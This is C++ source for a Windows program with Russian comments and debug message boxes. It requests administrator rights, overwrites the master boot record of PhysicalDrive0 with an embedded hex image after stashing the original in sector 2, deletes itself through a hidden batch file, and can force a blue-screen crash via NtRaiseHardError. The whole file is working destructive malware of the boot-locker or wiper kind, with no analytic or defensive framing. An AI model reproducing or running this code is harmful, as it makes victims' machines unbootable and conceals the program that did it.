#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

const char MBR_HEX[] = "{MBR_DATA}";

// === ОТЛАДОЧНЫЙ MESSAGEBOX ===
void Msg(const char* msg) {
    MessageBoxA(NULL, msg, "DEBUG", MB_OK | MB_ICONINFORMATION);
}

// === ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ===
bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, 
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    
    return isAdmin == TRUE;
}

// === ВЫЗОВ BSOD ===
void TriggerBSOD() {
    Msg("TriggerBSOD() called");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        Msg("ntdll.dll not loaded");
        return;
    }
    
    typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
        NTSTATUS ErrorStatus,
        ULONG NumberOfParameters,
        ULONG UnicodeStringParameterMask,
        PULONG_PTR Parameters,
        ULONG ResponseOption,
        PULONG Response
    );
    
    NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
    if (!NtRaiseHardError) {
        Msg("NtRaiseHardError not found");
        return;
    }
    
    ULONG_PTR params[4] = {0};
    ULONG response = 0;
    
    NtRaiseHardError(
        0xC000021A,
        1,
        0,
        params,
        6,
        &response
    );
    Msg("BSOD triggered");
}

// === ПОВЫШЕНИЕ ПРАВ ===
void ElevateAndRun() {
    Msg("ElevateAndRun() called");
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas";
    sei.lpFile = GetCommandLineA();
    sei.nShow = SW_HIDE;
    
    if (ShellExecuteExA(&sei)) {
        Msg("Elevated successfully, exiting...");
        ExitProcess(0);
    } else {
        Msg("Elevation failed!");
    }
}

// === КОНВЕРТЕР HEX ===
std::vector<unsigned char> HexToBytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        unsigned char byte = (unsigned char)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

// === ЗАПИСЬ MBR ===
void WriteMBR() {
    Msg("WriteMBR() START");
    
    std::string hex(MBR_HEX);
    Msg(("Hex length: " + std::to_string(hex.length())).c_str());
    
    std::vector<unsigned char> image = HexToBytes(hex);
    Msg(("Image size: " + std::to_string(image.size())).c_str());
    
    if (image.size() < 512) {
        Msg("ERROR: image.size() < 512");
        return;
    }
    
    Msg("Opening disk...");
    HANDLE hDisk = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
        NULL
    );
    
    if (hDisk == INVALID_HANDLE_VALUE) {
        Msg(("CreateFile failed, error: " + std::to_string(GetLastError())).c_str());
        // Fallback: обычный доступ
        hDisk = CreateFileA(
            "\\\\.\\PhysicalDrive0",
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );
        if (hDisk == INVALID_HANDLE_VALUE) {
            Msg(("Fallback failed, error: " + std::to_string(GetLastError())).c_str());
            return;
        }
        Msg("Disk opened via fallback");
    } else {
        Msg("Disk opened successfully");
    }
    
    // --- ШАГ 1: ЧИТАЕМ ОРИГИНАЛ ---
    Msg("Reading original MBR...");
    unsigned char originalMBR[512];
    DWORD bytesRead = 0;
    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
    if (!ReadFile(hDisk, originalMBR, 512, &bytesRead, NULL) || bytesRead != 512) {
        Msg("ReadFile failed!");
        CloseHandle(hDisk);
        return;
    }
    Msg("Original MBR read OK");
    
    // --- ШАГ 2: СОХРАНЯЕМ ОРИГИНАЛ В СЕКТОР 2 ---
    Msg("Saving original MBR to sector 2...");
    DWORD bytesWritten = 0;
    SetFilePointer(hDisk, 512 * 2, NULL, FILE_BEGIN);
    if (!WriteFile(hDisk, originalMBR, 512, &bytesWritten, NULL) || bytesWritten != 512) {
        Msg("WriteFile to sector 2 failed!");
        CloseHandle(hDisk);
        return;
    }
    Msg("Original MBR saved to sector 2");
    
    // --- ШАГ 3: ЗАПИСЫВАЕМ НАШ ОБРАЗ ---
    Msg("Writing our image...");
    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
    WriteFile(hDisk, image.data(), (DWORD)image.size(), &bytesWritten, NULL);
    Msg(("Image written, bytes: " + std::to_string(bytesWritten)).c_str());
    
    CloseHandle(hDisk);
    Msg("Disk closed");
    
    // --- Самоуничтожение ---
    Msg("Self-destruct...");
    char szPath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    Msg(("Path: " + std::string(szPath)).c_str());
    
    std::string batPath = std::string(szPath) + ".bat";
    std::ofstream bat(batPath.c_str());
    bat << "@echo off\n";
    bat << "timeout /t 1 /nobreak > nul\n";
    bat << "del \"" << szPath << "\"\n";
    bat << "del \"" << batPath << "\"\n";
    bat.close();
    Msg("Bat file created");
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    Msg("Bat file launched");
    
    // --- BSOD ---
    if (FindResourceA(NULL, "BSOD", "SETTING")) {
        Msg("BSOD flag found, triggering...");
        TriggerBSOD();
    } else {
        Msg("BSOD flag NOT found");
    }
    
    Msg("WriteMBR() END");
}

// === ТОЧКА ВХОДА ===
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    Msg("=== WinMain() START ===");
    
    if (!IsAdmin()) {
        Msg("Not admin, elevating...");
        ElevateAndRun();
        return 0;
    }
    Msg("Admin OK");
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    Msg("Console window hidden");
    
    WriteMBR();
    Msg("WriteMBR completed");
    
    Msg("=== WinMain() END ===");
    return 0;
}
